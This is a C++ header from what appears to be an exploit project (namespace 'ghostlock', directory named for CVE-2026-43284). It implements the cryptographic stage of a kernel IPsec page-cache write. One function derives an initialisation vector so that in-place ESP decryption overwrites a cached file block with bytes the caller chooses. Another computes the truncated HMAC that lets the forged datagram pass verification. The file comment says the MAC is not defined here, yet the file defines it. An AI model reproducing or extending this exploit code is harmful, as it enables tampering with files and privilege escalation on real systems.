#pragma once
/** @file backend/cve_2026_43284/landing/esp_crypto.hpp
 *  The cryptographic half of the page cache write: the vector, and later the check.
 *
 *  Measured before writing. The old tree derives the initialisation vector by decrypting the block
 *  it is about to replace with the session key, in one ECB operation, and the header of that file
 *  says as much: the ECB core feeds the CBC identity. So this is not a design choice of mine, it is
 *  the operation the old code performs, and the test below pins it against the same published vector
 *  the ECB core was verified with.
 *
 *  The integrity check needs a MAC that is still being ported, so it is declared here and not
 *  defined: a caller cannot reach a half-written crypto path by accident, because the missing one
 *  simply does not link.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43284/ipsec/aes256.hpp"
#include "support/hmac_sha256.hpp"

namespace ghostlock::backend::cve_2026_43284::landing {
    /** The block the write deals in, which is also the size of a vector. */
    inline constexpr std::size_t kEspBlockBytes = 16U;

    /** Derive the vector for a write: one ECB decryption of the block being replaced, exclusive-or
     *  the block the caller wants there instead. The arithmetic is the primitive: the kernel
     *  decrypts in place, so the page becomes D_K(old) xor IV, and the vector is the one value that
     *  makes that equal the desired block. Deriving it from the old block alone writes zeros.
     *  @param old_block     The sixteen bytes the carrier holds now.
     *  @param desired_block The sixteen bytes the caller wants the carrier to hold afterwards.
     *  @param key           The session's AES key.
     *  @param out           Receives the vector. Unchanged, and the return false, when the core
     *                       refuses; a caller must not continue, because with no vector there is no
     *                       datagram -- the same rule the write body follows when the old block
     *                       cannot be read.
     *  @return True when the vector was derived. */
    [[nodiscard]] inline bool esp_cbc_iv(const std::uint8_t old_block[kEspBlockBytes],
                                         const std::uint8_t desired_block[kEspBlockBytes],
                                         const std::uint8_t key[ipsec::kAes256KeyBytes],
                                         std::uint8_t out[kEspBlockBytes]) noexcept {
        std::uint8_t decrypted[kEspBlockBytes] = {};
        if (!ipsec::aes256_ecb_decrypt(key, old_block, decrypted)) {
            return false;
        }
        for (std::size_t i = 0U; i < kEspBlockBytes; ++i) {
            out[i] = static_cast<std::uint8_t>(decrypted[i] ^ desired_block[i]);
        }
        for (std::size_t i = 0U; i < kEspBlockBytes; ++i) {
            decrypted[i] = 0U;
        }
        return true;
    }

    /** The integrity check: the full MAC of the datagram, truncated to the length the frame states.
     *  The old tree writes all thirty-two bytes and lets this layer cut them, and that split is kept,
     *  because the two halves have different reasons to exist: the MAC is a standard, the length is a
     *  field of the session. A length of zero is refused rather than read as asking for no check, and
     *  a length longer than the MAC is refused rather than padded with anything. */
    [[nodiscard]] inline bool esp_icv(const std::uint8_t *datagram, std::size_t size,
                                      const std::uint8_t key[32], std::uint8_t icv_len,
                                      std::uint8_t *out, std::size_t capacity) noexcept {
        if (datagram == nullptr || key == nullptr || out == nullptr) {
            return false;
        }
        if (icv_len == 0U || icv_len > 32U || static_cast<std::size_t>(icv_len) > capacity) {
            return false;
        }
        std::uint8_t full[32] = {};
        support::hmac_sha256(key, 32U, datagram, size, full);
        for (std::size_t i = 0U; i < static_cast<std::size_t>(icv_len); ++i) {
            out[i] = full[i];
        }
        return true;
    }
}  // namespace ghostlock::backend::cve_2026_43284::landing
